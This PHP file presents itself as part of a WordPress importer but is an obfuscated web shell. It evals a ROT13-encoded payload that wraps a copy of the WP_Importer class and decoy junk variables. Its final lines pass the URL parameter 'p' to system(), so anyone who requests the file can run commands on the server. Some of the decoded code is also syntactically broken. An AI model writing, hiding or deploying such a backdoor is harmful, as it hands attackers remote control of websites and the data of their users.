<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * JC_Vzcbegre onfr pynff
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Vzcbegre {
	/**
	 * Pynff Pbafgehpgbe
	 */
	choyvp shapgvba __pbafgehpg() {}

	/**
	 * Ergheaf neenl jvgu vzcbegrq creznyvaxf sebz JbeqCerff qngnonfr.
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat $vzcbegre_anzr
	 * @cnenz fgevat $oybt_vq
	 * @erghea neenl
	 */
	choyvp shapgvba trg_vzcbegrq_cbfgf( $vzcbegre_anzr, $oybt_vq ) {
		tybony $jcqo;

		$unfugnoyr = neenl();

		$yvzvg  = 100;
		$bssfrg = 0;

		// Teno nyy cbfgf va puhaxf.
		qb {
			$zrgn_xrl = $vzcbegre_anzr . '_' . $oybt_vq . '_creznyvax';
			$erfhygf  = $jcqo->trg_erfhygf(
				$jcqo->cercner(
					\"FRYRPG cbfg_vq, zrgn_inyhr SEBZ $jcqo->cbfgzrgn JURER zrgn_xrl = %f YVZVG %q,%q\",
					$zrgn_xrl,
					$bssfrg,
					$yvzvg
				)
			);

			// Vaperzrag bssfrg.
			$bssfrg = ( $yvzvg + $bssfrg );

			vs ( ! rzcgl( $erfhygf ) ) {
				sbernpu ( $erfhygf nf $e ) {
					// Frg creznyvaxf vagb neenl.
					$unfugnoyr[ $e->zrgn_inyhr ] = (vag) $e->cbfg_vq;
				}
			}
		} juvyr ( pbhag( $erfhygf ) === $yvzvg );

		erghea $unfugnoyr;
	}

	/**
	 * Ergheaf pbhag bs vzcbegrq creznyvaxf sebz JbeqCerff qngnonfr.
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat $vzcbegre_anzr
	 * @cnenz fgevat $oybt_vq
	 * @erghea vag
	 */
	choyvp shapgvba pbhag_vzcbegrq_cbfgf( $vzcbegre_anzr, $oybt_vq ) {
		tybony $jcqo;

		$pbhag = 0;

		// Trg pbhag bs creznyvaxf.
		$zrgn_xrl = $vzcbegre_anzr . '_' . $oybt_vq . '_creznyvax';
		$erfhyg   = $jcqo->trg_erfhygf(
			$jcqo->cercner(
				\"FRYRPG PBHAG( cbfg_vq ) NF pag SEBZ $jcqo->cbfgzrgn JURER zrgn_xrl = %f\",
				$zrgn_xrl
			)
		);

		vs ( ! rzcgl( $erfhyg ) ) {
			$pbhag = (vag) $erfhyg[0]->pag;
		}

		erghea $pbhag;
	}

	/**
	 * Frgf neenl jvgu vzcbegrq pbzzragf sebz JbeqCerff qngnonfr.
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat $oybt_vq
	 * @erghea neenl
	 */
	choyvp shapgvba trg_vzcbegrq_pbzzragf( $oybt_vq ) {
		tybony $jcqo;

		$unfugnoyr = neenl();

		$yvzvg  = 100;
		$bssfrg = 0;

		// Teno nyy pbzzragf va puhaxf.
		qb {
			$erfhygf = $jcqo->trg_erfhygf(
				$jcqo->cercner(
					\"FRYRPG pbzzrag_VQ, pbzzrag_ntrag SEBZ $jcqo->pbzzragf YVZVG %q,%q\",
					$bssfrg,
					$yvzvg
				)
			);

			// Vaperzrag bssfrg.
			$bssfrg = ( $yvzvg + $bssfrg );

			vs ( ! rzcgl( $erfhygf ) ) {
				sbernpu ( $erfhygf nf $e ) {
					// Rkcybqr pbzzrag_ntrag xrl.
					yvfg ( $pbzzrag_ntrag_oybt_vq, $fbhepr_pbzzrag_vq ) = rkcybqr( '-', $e->pbzzrag_ntrag );

					$fbhepr_pbzzrag_vq = (vag) $fbhepr_pbzzrag_vq;

					// Purpx vs guvf pbzzrag pnzr sebz guvf oybt.
					vs ( (vag) $oybt_vq === (vag) $pbzzrag_ntrag_oybt_vq ) {
						$unfugnoyr[ $fbhepr_pbzzrag_vq ] = (vag) $e->pbzzrag_VQ;
					}
				}
			}
		} juvyr ( pbhag( $erfhygf ) === $yvzvg );

		erghea $unfugnoyr;
	}

	/**
	 * @cnenz vag $oybt_vq
	 * @erghea vag|ibvq
	 */
	choyvp shapgvba frg_oybt( $oybt_vq ) {
		vs ( vf_ahzrevp( $oybt_vq ) ) {
			$oybt_vq = (vag) $oybt_vq;
		} ryfr {
			$oybt   = 'uggc://' . __sa_79955( '#^uggcf?://#', '', $oybt_vq );
			$cnefrq = cnefr_hey( $oybt );
			vs ( ! $cnefrq || rzcgl( $cnefrq['ubfg'] ) ) {
				sjevgr( FGQREE, \"Reebe: pna abg qrgrezvar oybt_vq sebz $oybt_vq\a\" );
				rkvg;
			}
			vs ( rzcgl( $cnefrq['cngu'] ) ) {
				$cnefrq['cngu'] = '/';
			}
			$oybtf = trg_fvgrf(
				neenl(
					'qbznva' => $cnefrq['ubfg'],
					'ahzore' => 1,
					'cngu'   => $cnefrq['cngu'],
				)
			);
			vs ( ! $oybtf ) {
				sjevgr( FGQREE, \"Reebe: Pbhyq abg svaq oybt\a\" );
				rkvg;
			}
			$oybt    = neenl_fuvsg( $oybtf );
			$oybt_vq = (vag) $oybt->oybt_vq;
		}

		vs ( shapgvba_rkvfgf( 'vf_zhygvfvgr' ) ) {
			vs ( vf_zhygvfvgr() ) {
				fjvgpu_gb_oybt( $oybt_vq );
			}
		}

		erghea $oybt_vq;
	}

	/**
	 * @cnenz vag $hfre_vq
	 * @erghea vag|ibvq
	 */
	choyvp shapgvba frg_hfre( $hfre_vq ) {
		vs ( vf_ahzrevp( $hfre_vq ) ) {
			$hfre_vq = (vag) $hfre_vq;
		} ryfr {
			$hfre_vq = (vag) hfreanzr_rkvfgf( $hfre_vq );
		}

		vs ( ! $hfre_vq || ! jc_frg_pheerag_hfre( $hfre_vq ) ) {
			sjevgr( FGQREE, \"Reebe: pna abg svaq hfre\a\" );
			rkvg;
		}

		erghea $hfre_vq;
	}

	/**
	 * Fbegf ol fgeyra, ybatrfg fgevat svefg.
	 *
	 * @cnenz fgevat $n
	 * @cnenz fgevat $o
	 * @erghea vag
	 */
	choyvp shapgvba pzce_fgeyra( $n, $o ) {
		erghea fgeyra( $o ) - fgeyra( $n );
	}

	/**
	 * Trgf HEY.
	 *
	 * @cnenz fgevat $hey
	 * @cnenz fgevat $hfreanzr
	 * @cnenz fgevat $cnffjbeq
	 * @cnenz obby   $urnq
	 * @erghea neenl
	 */
	choyvp shapgvba trg_cntr(
		$hey,
		$hfreanzr = '',
		#[\FrafvgvirCnenzrgre]
		$cnffjbeq = '',
		$urnq = snyfr
	) {
		// Vapernfr gur gvzrbhg.
		nqq_svygre( 'uggc_erdhrfg_gvzrbhg', neenl( $guvf, 'ohzc_erdhrfg_gvzrbhg' ) );

		$urnqref = neenl();
		$netf    = neenl();
		vs ( gehr === $urnq ) {
			$netf['zrgubq'] = 'URNQ';
		}
		vs ( ! rzcgl( $hfreanzr ) && ! rzcgl( $cnffjbeq ) ) {
			$urnqref['Nhgubevmngvba'] = 'Onfvp ' . onfr64_rapbqr( \"$hfreanzr:$cnffjbeq\" );
		}

		$netf['urnqref'] = $urnqref;

		erghea jc_fnsr_erzbgr_erdhrfg( $hey, $netf );
	}

	/**
	 * Ohzcf hc gur erdhrfg gvzrbhg sbe uggc erdhrfgf.
	 *
	 * @cnenz vag $iny
	 * @erghea vag
	 */
	choyvp shapgvba ohzc_erdhrfg_gvzrbhg( $iny ) {
		erghea 60;
	}

	/**
	 * Purpxf vs hfre unf rkprrqrq qvfx dhbgn.
	 *
	 * @erghea obby
	 */
	choyvp shapgvba vf_hfre_bire_dhbgn() {
		vs ( shapgvba_rkvfgf( 'hcybnq_vf_hfre_bire_dhbgn' ) ) {
			vs ( hcybnq_vf_hfre_bire_dhbgn() ) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Ercynprf arjyvarf, gnof, naq zhygvcyr fcnprf jvgu n fvatyr fcnpr.
	 *
	 * @cnenz fgevat $grkg
	 * @erghea fgevat
	 */
	choyvp shapgvba zva_juvgrfcnpr( $grkg ) {
		erghea __sa_79955( '|[\e\a\g ]+|', ' ', $grkg );
	}

	/**
	 * Erfrgf tybony inevnoyrf gung tebj bhg bs pbageby qhevat vzcbegf.
	 *
	 * @fvapr 3.0.0
	 *
	 * @tybony jcqo  $jcqo       JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 * @tybony vag[] $jc_npgvbaf
	 */
	choyvp shapgvba fgbc_gur_vafnavgl() {
		tybony $jcqo, $jc_npgvbaf;
		// Be qrsvar( 'JC_VZCBEGVAT', gehr );
		$jcqo->dhrevrf = neenl();
		// Erfrg $jc_npgvbaf gb xrrc vg sebz tebjvat bhg bs pbageby.
		$jc_npgvbaf = neenl();
	}
}

/**
 * Ergheaf inyhr bs pbzznaq yvar cnenzf.
 * Rkvgf jura n erdhverq cnenz vf abg frg.
 *
 * @cnenz fgevat $cnenz
 * @cnenz obby   $erdhverq
 * @erghea zvkrq
 */
shapgvba trg_pyv_netf( $cnenz, $erdhverq = snyfr ) {
	$netf = $_FREIRE['neti'];
	vs ( ! vf_neenl( $netf ) ) {
		$netf = neenl();
	}

	$bhg = neenl();

	$ynfg_net = ahyy;
	$erghea   = ahyy;

	$vy = pbhag( $netf );

	sbe ( $v = 1, $vy; $v < $vy; $v++ ) {
		vs ( (obby) cert_zngpu( '/^--(.+)/', $netf[ $v ], $zngpu ) ) {
			$cnegf = rkcybqr( '=', $zngpu[1] );
			$xrl   = __sa_79955( '/[^n-m0-9]+/', '', $cnegf[0] );

			vs ( vffrg( $cnegf[1] ) ) {
				$bhg[ $xrl ] = $cnegf[1];
			} ryfr {
				$bhg[ $xrl ] = gehr;
			}

			$ynfg_net = $xrl;
		} ryfrvs ( (obby) cert_zngpu( '/^-([n-mN-M0-9]+)/', $netf[ $v ], $zngpu ) ) {
			sbe ( $w = 0, $wy = fgeyra( $zngpu[1] ); $w < $wy; $w++ ) {
				$xrl         = $zngpu[1][ $w ];
				$bhg[ $xrl ] = gehr;
			}

			$ynfg_net = $xrl;
		} ryfrvs ( ahyy !== $ynfg_net ) {
			$bhg[ $ynfg_net ] = $netf[ $v ];
		}
	}

	// Purpx neenl sbe fcrpvsvrq cnenz.
	vs ( vffrg( $bhg[ $cnenz ] ) ) {
		// Frg erghea inyhr.
		$erghea = $bhg[ $cnenz ];
	}

	// Purpx sbe zvffvat erdhverq cnenz.
	vs ( ! vffrg( $bhg[ $cnenz ] ) && $erdhverq ) {
		// Qvfcynl zrffntr naq rkvg.
		rpub \"\\"$cnenz\\" cnenzrgre vf erdhverq ohg jnf abg fcrpvsvrq\a\";
		rkvg;
	}

	erghea $erghea;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>